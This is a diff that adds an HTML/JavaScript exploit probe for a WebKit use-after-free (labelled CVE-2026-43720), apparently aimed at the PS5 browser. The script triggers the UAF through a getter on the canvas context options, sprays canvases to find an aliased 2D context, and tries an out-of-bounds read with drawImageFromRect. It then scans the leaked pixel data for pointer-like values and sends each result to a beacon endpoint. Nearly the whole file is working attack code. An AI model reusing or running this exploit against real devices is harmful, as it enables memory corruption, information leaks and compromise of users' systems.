@@ -1,0 +1,229 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635k-slim</title></head>
+<body><pre id="out">p635k-slim: webkit APIs + drawImageFromRect (low memory)</pre>
+<script>
+'use strict';
+/*
+  p635k-slim: CVE-2026-43720 — webkit-prefixed APIs, SINGLE UAF instance
+  -- prior art: p635j found webkit-prefixed APIs on PS5
+  -- Memory-optimized: 1 UAF instance, 50-canvas spray (not 200×7)
+
+  CRASH_CLASS: MODERATE
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635K-' + tag + (d !== undefined ? '-' + String(d).slice(0, 600) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635k-slim', msg:msg, level:'info', sid:'p635ks-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+bk('START', navigator.userAgent);
+
+// Single UAF instance with small spray
+var inner = null, alias = null, aliasIdx = -1;
+var spray = [];
+
+(function() {
+  var cv = document.createElement('canvas');
+  cv.width = 32; cv.height = 32; // smaller canvas = less memory
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { cv.getContext('bitmaprenderer', opts); } catch(e) {}
+
+  // Small spray: 50 canvases
+  for (var i = 0; i < 50; i++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    spray.push(c.getContext('2d'));
+  }
+
+  var SENT = 77777.5;
+  try { inner.lineWidth = SENT; } catch(e) { bk('ALIAS', 'inner-write-fail'); return; }
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].lineWidth === SENT) { alias = spray[i]; aliasIdx = i; break; }
+  }
+})();
+
+bk('ALIAS', alias ? 'spray['+aliasIdx+']' : 'NONE');
+if (!alias) { bk('DONE', 'no alias'); }
+
+if (alias) {
+
+// --- A: webkitBackingStorePixelRatio ---
+try {
+  var pr1 = inner.webkitBackingStorePixelRatio;
+  var pr2 = alias.webkitBackingStorePixelRatio;
+  bk('A-BSPR', 'inner=' + pr1 + '(' + f64hex(pr1) + ') alias=' + pr2 + '(' + f64hex(pr2) + ')');
+  if (pr1 !== pr2) bk('A-BSPR-DIFF', 'MISMATCH');
+  if (isPointerLike(pr1)) bk('A-BSPR-PTR', 'pointer-like!');
+} catch(e) { bk('A-BSPR', 'ERR:' + e.message.slice(0,40)); }
+
+// webkitLineDash cross-read
+try {
+  alias.webkitLineDash = [5, 10, 15];
+  var rd = inner.webkitLineDash;
+  bk('A-WKLD', JSON.stringify(rd).slice(0,60));
+  var std = inner.getLineDash();
+  bk('A-STD-LD', JSON.stringify(std).slice(0,60));
+} catch(e) { bk('A-WKLD', 'ERR:' + e.message.slice(0,40)); }
+
+// Enumerate webkit methods
+try {
+  var proto = Object.getPrototypeOf(inner);
+  var wk = Object.getOwnPropertyNames(proto).filter(function(n) {
+    return n.indexOf('webkit') === 0 || n.indexOf('set') === 0 || n.indexOf('draw') === 0;
+  });
+  bk('A-WK', wk.join(','));
+} catch(e) { bk('A-WK', 'ERR'); }
+
+bk('A-DONE', 'survived');
+
+// --- B: Apple private color APIs ---
+try {
+  alias.setFillColor(255, 0, 128, 1.0);
+  bk('B-FILL-RGBA', inner.fillStyle);
+} catch(e) { bk('B-FILL-RGBA', 'ERR:' + e.message.slice(0,40)); }
+
+try {
+  alias.setFillColor(0.5);
+  bk('B-FILL-GRAY', inner.fillStyle);
+} catch(e) { bk('B-FILL-GRAY', 'ERR:' + e.message.slice(0,40)); }
+
+try {
+  alias.setFillColor(0.1, 0.2, 0.3, 0.4, 1.0);
+  bk('B-FILL-CMYK', inner.fillStyle);
+} catch(e) { bk('B-FILL-CMYK', 'ERR:' + e.message.slice(0,40)); }
+
+try {
+  alias.setStrokeColor(0, 255, 0, 0.5);
+  bk('B-STROKE', inner.strokeStyle);
+} catch(e) { bk('B-STROKE', 'ERR:' + e.message.slice(0,40)); }
+
+try {
+  alias.setAlpha(0.42);
+  bk('B-ALPHA', inner.globalAlpha + '(' + f64hex(inner.globalAlpha) + ')');
+} catch(e) { bk('B-ALPHA', 'ERR:' + e.message.slice(0,40)); }
+
+try {
+  if (alias.setShadow) {
+    alias.setShadow(10, 20, 30, 'red');
+    bk('B-SHADOW', 'sox='+inner.shadowOffsetX+' soy='+inner.shadowOffsetY+' sb='+inner.shadowBlur+' sc='+inner.shadowColor);
+  } else { bk('B-SHADOW', 'absent'); }
+} catch(e) { bk('B-SHADOW', 'ERR:' + e.message.slice(0,40)); }
+
+bk('B-DONE', 'survived');
+
+// --- C: drawImageFromRect with OOB ---
+try {
+  if (alias.drawImageFromRect) {
+    var src = document.createElement('canvas');
+    src.width = 32; src.height = 32;
+    var sctx = src.getContext('2d');
+    sctx.fillStyle = '#DE00BE';
+    sctx.fillRect(0, 0, 32, 32);
+
+    // Normal draw
+    alias.drawImageFromRect(src, 0, 0, 32, 32, 0, 0, 32, 32, 'copy');
+    var px = inner.getImageData(0, 0, 1, 1);
+    bk('C-NORMAL', px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
+
+    // OOB source rect — read past canvas backing
+    alias.drawImageFromRect(src, -50, -50, 132, 132, 0, 0, 32, 32, 'copy');
+    var px2 = inner.getImageData(0, 0, 32, 32);
+    var nonDE = 0, samples = [];
+    for (var i = 0; i < px2.data.length; i += 4) {
+      if (px2.data[i] !== 0xDE || px2.data[i+1] !== 0 || px2.data[i+2] !== 0xBE) {
+        nonDE++;
+        if (samples.length < 3) samples.push('px['+(i/4)+']='+px2.data[i]+','+px2.data[i+1]+','+px2.data[i+2]+','+px2.data[i+3]);
+      }
+    }
+    bk('C-OOB', nonDE + ' non-pattern' + (samples.length > 0 ? ' ' + samples.join(' ') : ''));
+
+    // Check f64 for pointers
+    var fv = new Float64Array(px2.data.buffer);
+    var ptrs = [];
+    for (var j = 0; j < fv.length; j++) {
+      if (isPointerLike(fv[j])) ptrs.push('['+j+']='+f64hex(fv[j]));
+      if (ptrs.length >= 3) break;
+    }
+    bk('C-PTR', ptrs.length > 0 ? ptrs.join(' ') : 'none');
+
+    src = null; sctx = null; // free
+  } else {
+    bk('C-ABSENT', 'drawImageFromRect not on prototype');
+  }
+} catch(e) { bk('C-ERR', e.message.slice(0,60)); }
+
+bk('C-DONE', 'survived');
+
+// --- D: CSS filter + toDataURL formats ---
+try {
+  bk('D-FILTER', 'default=' + (inner.filter || 'undefined'));
+  alias.filter = 'blur(0px)';
+  bk('D-FILTER-SET', inner.filter || 'undef');
+} catch(e) { bk('D-FILTER', 'ERR:' + e.message.slice(0,40)); }
+
+var fmts = ['image/png', 'image/jpeg', 'image/webp'];
+for (var i = 0; i < fmts.length; i++) {
+  try {
+    var cv = alias.canvas || inner.canvas;
+    var url = cv.toDataURL(fmts[i], 0.01);
+    bk('D-FMT-'+i, fmts[i] + ' len=' + url.length);
+  } catch(e) { bk('D-FMT-'+i, fmts[i] + ' ERR'); }
+}
+
+bk('D-DONE', 'survived');
+
+// --- E: getContextAttributes ---
+try {
+  var attrs = inner.getContextAttributes();
+  bk('E-ATTRS', JSON.stringify(attrs));
+} catch(e) { bk('E-ATTRS', 'ERR:' + e.message.slice(0,40)); }
+
+// --- F: Capabilities for future probes ---
+try { bk('F-WASM', typeof WebAssembly); } catch(e) { bk('F-WASM', 'absent'); }
+try { bk('F-WORKER', typeof Worker); } catch(e) { bk('F-WORKER', 'absent'); }
+try { bk('F-SAB', typeof SharedArrayBuffer); } catch(e) { bk('F-SAB', 'absent'); }
+try { bk('F-WEAKREF', typeof WeakRef); } catch(e) { bk('F-WEAKREF', 'absent'); }
+try { bk('F-FINREG', typeof FinalizationRegistry); } catch(e) { bk('F-FINREG', 'absent'); }
+
+bk('F-DONE', 'survived');
+
+} // end if(alias)
+
+// Clean up spray to free memory
+spray = null; alias = null; inner = null;
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
